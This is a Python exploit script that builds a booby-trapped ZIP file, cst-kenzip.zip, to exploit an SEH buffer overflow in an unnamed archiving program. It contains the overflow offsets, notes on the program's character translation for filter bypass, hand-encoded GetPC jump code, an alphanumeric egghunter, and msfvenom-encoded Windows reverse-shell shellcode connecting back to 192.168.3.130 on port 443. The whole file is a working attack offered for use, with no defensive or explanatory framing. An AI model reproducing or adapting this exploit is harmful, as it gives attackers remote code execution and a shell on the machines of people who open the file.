#!/usr/bin/python
import struct

def p(a):
        return struct.pack("I", a)

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")
 
#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")
 
# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")
 
MAXSIZE = 4064

#exploit = "B" * MAXSIZE

# SEH Offset 1026
# nSEH Offset 1022

# PPR 0041111D - Alpha Numeric
SEH = p(0x0041111D)

# 9f is translated to 83 by the application.
# Jumps back around 123 Bytes space
nSEH = "\x71\x9f\x71\x9f"


#Stage1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
# Allowed chars
# 30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56
# 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A
# 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
# Stage1 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

# 01 - 30 good except 00 0a 0d 0f 14 15
# 30 - 7f good

#
# Translations
# ------------
# 0F - A4
# 14 - B6
# 15 - A7

# OG 	: 80 81 82 83 84 85 86 87 88 89 8A 8B 8C 8D 8E 8F 90 91 92 93 94 95 96 97 98 99 9A 9B 9C 9D 9E 9F
# TXLTD	: C7 FC E9 E2 E4 E0 E5 E7 EA EB E8 EF EE EC C4 C5 C9 E6 C6 F4 F6 F2 FB F9 FF D6 DC A2 A3 A5 50 83

# OG	: a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf
# TXLTD	: E1 ED F3 FA F1 D1 AA BA BF AC AC BD BC A1 AB BB A6 A6 A6 A6 A6 A6 A6 2B 2B A6 A6 2B 2B 2B 2B 2B

# OG	: c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df
# TXLTD	: 2B 2D 2D 2B 2D 2B A6 A6 2B 2B 2D 2D A6 2D 2B 2D 2D 2D 2D 2B 2B 2B 2B 2B 2B 2B 2B A6 5F A6 A6 AF

# OG 	: e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff
# TXLTD	: 61 DF 47 70 53 73 B5 74 46 54 4F 64 38 66 65 6E 3D B1 3D 3D 28 29 F7 98 B0 B7 B7 76 6E B2 A6 A0

"""
OG SHELLCODE FOR GET-PC
------------------------
E9 05		# JMP SHORT 05
5E		# POP ESI
41		# INC ECX - NOP EQUIVALENT
FF D6		# CALL ESI
41		# INC ECX - NOP EQUIVALENT
E8 F6 FF FF FF	# CALL - POP ESI LINE
		# 0-10 = FFFFFFF6
"""

getpc = ("\x82\x05"                     # JMP SHORT 05
         "\x5e"                         # POP ESI
         "\x41"                         # INC ECX - NOP EQUIVALENT
         "\x98\x99"                     # CALL ESI
         "\x41"                         # INC ECX - NOP EQUIVALENT
         "\x8a\x94\x98\x98\x98")        # CALL - POP ESI LINE
                                        # 0-10 = FFFF FFFF FFFF FFF6

# echo -ne "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7" |
# msfvenom -p- --platform windows -a x86 -f c BufferRegister=ESI -b "\x00\x0a\x0d" -e x86/alpha_mixed
egghunter = ("\x56\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x50\x66\x4e\x61\x38\x4a\x49\x6f"
"\x66\x6f\x43\x72\x52\x72\x61\x7a\x44\x42\x43\x68\x5a\x6d\x44"
"\x6e\x45\x6c\x63\x35\x63\x6a\x42\x54\x6a\x4f\x48\x38\x51\x44"
"\x34\x70\x46\x50\x30\x57\x4c\x4b\x48\x7a\x4c\x6f\x63\x45\x38"
"\x6a\x4c\x6f\x34\x35\x49\x77\x59\x6f\x68\x67\x41\x41")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 BufferRegister=EDI -f c -b "\x00\x0a\x0d" -e x86/alpha_mixed
shellcode = ("\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x39\x6c\x49\x78\x4d\x52\x33\x30"
"\x43\x30\x35\x50\x75\x30\x4d\x59\x38\x65\x75\x61\x6f\x30\x42"
"\x44\x6e\x6b\x62\x70\x36\x50\x6e\x6b\x63\x62\x56\x6c\x6c\x4b"
"\x32\x72\x35\x44\x4e\x6b\x54\x32\x36\x48\x36\x6f\x58\x37\x63"
"\x7a\x45\x76\x46\x51\x4b\x4f\x4c\x6c\x55\x6c\x73\x51\x51\x6c"
"\x35\x52\x56\x4c\x45\x70\x49\x51\x68\x4f\x64\x4d\x43\x31\x4f"
"\x37\x4d\x32\x4a\x52\x72\x72\x31\x47\x4c\x4b\x66\x32\x46\x70"
"\x4c\x4b\x33\x7a\x55\x6c\x6e\x6b\x62\x6c\x37\x61\x62\x58\x4d"
"\x33\x31\x58\x65\x51\x38\x51\x70\x51\x4e\x6b\x66\x39\x47\x50"
"\x67\x71\x48\x53\x4e\x6b\x51\x59\x47\x68\x58\x63\x74\x7a\x72"
"\x69\x6e\x6b\x44\x74\x4c\x4b\x67\x71\x6a\x76\x76\x51\x49\x6f"
"\x4e\x4c\x6f\x31\x48\x4f\x76\x6d\x46\x61\x7a\x67\x74\x78\x69"
"\x70\x34\x35\x6c\x36\x54\x43\x73\x4d\x7a\x58\x65\x6b\x53\x4d"
"\x55\x74\x63\x45\x48\x64\x76\x38\x6e\x6b\x50\x58\x31\x34\x45"
"\x51\x4e\x33\x71\x76\x6e\x6b\x36\x6c\x70\x4b\x4c\x4b\x66\x38"
"\x45\x4c\x43\x31\x6e\x33\x6e\x6b\x35\x54\x4c\x4b\x75\x51\x78"
"\x50\x4d\x59\x37\x34\x65\x74\x46\x44\x31\x4b\x33\x6b\x71\x71"
"\x56\x39\x30\x5a\x76\x31\x6b\x4f\x69\x70\x61\x4f\x63\x6f\x73"
"\x6a\x6e\x6b\x32\x32\x48\x6b\x4e\x6d\x53\x6d\x43\x58\x66\x53"
"\x65\x62\x33\x30\x67\x70\x42\x48\x44\x37\x53\x43\x44\x72\x53"
"\x6f\x30\x54\x30\x68\x42\x6c\x64\x37\x55\x76\x77\x77\x49\x6f"
"\x58\x55\x6f\x48\x7a\x30\x43\x31\x73\x30\x55\x50\x74\x69\x78"
"\x44\x63\x64\x30\x50\x35\x38\x35\x79\x4f\x70\x42\x4b\x37\x70"
"\x39\x6f\x49\x45\x46\x30\x32\x70\x56\x30\x76\x30\x67\x30\x62"
"\x70\x47\x30\x62\x70\x61\x78\x79\x7a\x76\x6f\x59\x4f\x79\x70"
"\x59\x6f\x6e\x35\x4e\x77\x52\x4a\x73\x35\x53\x58\x49\x50\x6f"
"\x58\x53\x33\x4e\x62\x70\x68\x65\x52\x43\x30\x66\x61\x4d\x6b"
"\x6e\x69\x79\x76\x33\x5a\x74\x50\x50\x56\x53\x67\x75\x38\x5a"
"\x39\x59\x35\x62\x54\x30\x61\x49\x6f\x48\x55\x6f\x75\x79\x50"
"\x54\x34\x36\x6c\x79\x6f\x30\x4e\x56\x68\x33\x45\x68\x6c\x32"
"\x48\x58\x70\x48\x35\x69\x32\x66\x36\x79\x6f\x6a\x75\x42\x48"
"\x75\x33\x70\x6d\x43\x54\x57\x70\x4b\x39\x59\x73\x32\x77\x63"
"\x67\x30\x57\x35\x61\x79\x66\x32\x4a\x65\x42\x71\x49\x62\x76"
"\x4b\x52\x59\x6d\x53\x56\x6a\x67\x43\x74\x64\x64\x45\x6c\x76"
"\x61\x67\x71\x6e\x6d\x63\x74\x31\x34\x74\x50\x5a\x66\x73\x30"
"\x37\x34\x62\x74\x66\x30\x30\x56\x72\x76\x52\x76\x37\x36\x53"
"\x66\x50\x4e\x76\x36\x61\x46\x33\x63\x71\x46\x51\x78\x42\x59"
"\x38\x4c\x45\x6f\x4b\x36\x69\x6f\x4a\x75\x4c\x49\x4d\x30\x50"
"\x4e\x52\x76\x30\x46\x59\x6f\x46\x50\x75\x38\x76\x68\x6c\x47"
"\x55\x4d\x51\x70\x4b\x4f\x4a\x75\x6f\x4b\x5a\x50\x6f\x45\x49"
"\x32\x62\x76\x61\x78\x49\x36\x6c\x55\x4d\x6d\x6d\x4d\x79\x6f"
"\x7a\x75\x47\x4c\x34\x46\x61\x6c\x35\x5a\x6b\x30\x59\x6b\x4b"
"\x50\x64\x35\x46\x65\x6f\x4b\x62\x67\x77\x63\x33\x42\x32\x4f"
"\x42\x4a\x45\x50\x32\x73\x39\x6f\x38\x55\x41\x41")

"""
jump back 200 bytes
-------------------
JMP FFFFFF38
E9 38 FF FF FF
82 38 98 98 98
"""
Stage1 =  "\x82\x38\x98\x98\x98"

exploit = "A" * (1022 - 123 - 200)
exploit += getpc + egghunter + "A"*(200- len(getpc) - len(egghunter))
exploit += Stage1 + "A" * (123 - len(Stage1)) 
exploit += nSEH
exploit += SEH
exploit += "D"*16 + "T00WT00W" + shellcode + "D"* (MAXSIZE - 1022 - 8 - 16 - 8 - len(shellcode))

exploit += ".txt"

print "[+] Writing payload to cst-kenzip.zip"
# write the payload
mefile = open('cst-kenzip.zip','w');
mefile.write(ldf_header + exploit + cdf_header + exploit + eofcdf_header);
mefile.close()
print "[+] Exploit file created!!"

